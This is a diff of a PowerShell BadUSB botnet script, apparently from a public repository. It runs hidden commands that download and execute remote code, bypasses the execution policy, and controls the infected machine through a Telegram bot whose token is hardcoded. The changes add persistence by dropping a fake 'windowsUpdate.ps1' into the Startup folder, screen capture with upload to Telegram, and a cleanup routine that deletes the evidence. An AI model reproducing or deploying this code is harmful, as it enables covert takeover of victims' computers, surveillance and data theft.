@@ -1,13 +1,12 @@
 <#
 BADUSB COMMANDS:
-# Execute 
-powershell.exe -windowstyle hidden -file this_file.ps1
+    # Execute 
+    powershell.exe -windowstyle hidden -file this_file.ps1
 
-#Execute script from github
-iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1'))
-
-PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1'))
-PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
+    #Execute script from github
+    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
+    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
+    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
 #>
 
 ############
@@ -16,17 +15,40 @@ PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebCl
 
 $BotToken = "688087783:AAGT_3LMrnPPnym-RIkrfSIWbiEZaTL_f_4"
 $ChatID = '-242346194'
+$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
 
 
-#####################
-## BYPASS POLICIES ##
-#####################
+###############
+## FUNCTIONS ##
+###############
 
-Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+function backdoor {
+        Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
+        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
+        Invoke-Expression -Command:$command 
+        Stop-Process -Name "cmd" -Confirm -PassThru
+        Copy-Item "C:\Users\$env:username\Documents\windowsUpdate.ps1" -Destination "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windowsUpdate.ps1"
+}
 
-# FUNCTIONS
+function screenshot {
+      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+        function screenshot([Drawing.Rectangle]$bounds, $path) {
+           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+           $graphics = [Drawing.Graphics]::FromImage($bmp)
 
-function upload{
+           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+           $bmp.Save($path)
+
+           $graphics.Dispose()
+           $bmp.Dispose()
+        }
+
+        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
+        screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
+}
+
+function upload {
 Param ( 
         [Parameter(Position = 0)]
         $url,
@@ -69,6 +91,19 @@ Invoke-RestMethod -Uri $url -Method Post  -ContentType "multipart/form-data;boun
 
 }
 
+function cleanall {
+    rm C:\Users\afranco\Documents\screenshot.jpg
+    rm C:\Users\afranco\Documents\windowsUpdate.ps1
+}
+
+
+#####################
+## BYPASS POLICIES ##
+#####################
+
+Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+
+
 ##########################
 ## CONNECT WITH CHANNEL ##
 ##########################
@@ -100,8 +135,6 @@ Invoke-WebRequest `
 ######################
 ## WAIT FOR COMMAND ##
 ######################
-
-# /select <IP> whoami
 
 #Time to sleep for each loop before checking if a message with the magic word was received
 $LoopSleep = 3
@@ -183,21 +216,7 @@ While ($DoNotExit)  {
         -Body (ConvertTo-Json -Compress -InputObject $payload)
       }
       "/screenshot $ipV4"{
-      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
-        function screenshot([Drawing.Rectangle]$bounds, $path) {
-           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
-           $graphics = [Drawing.Graphics]::FromImage($bmp)
-
-           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-
-           $bmp.Save($path)
-
-           $graphics.Dispose()
-           $bmp.Dispose()
-        }
-
-        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
-        screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
+        screenshot
         $filepath = 'C:\Users\afranco\Documents\screenshot.jpg'
         $url = "https://api.telegram.org/bot$($BotToken)/sendPhoto?chat_id=$($ChatID)"
         $name = "test"
@@ -206,11 +225,10 @@ While ($DoNotExit)  {
         
       }
       "/backdoor $ipV4"  {
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\afranco\Documents\windowsUpdate.ps1
-        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\afranco\Documents\windowsUpdate.ps1"
-        Invoke-Expression -Command:$command 
-        Stop-Process -Name "cmd" -Confirm -PassThru
-        # Falta añadirlo al inicio de windows
+        backdoor
+        # Check backdoor
+        $windowsStartup = Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List 
+
       }
 	  default  {
 	    #The message sent is unknown
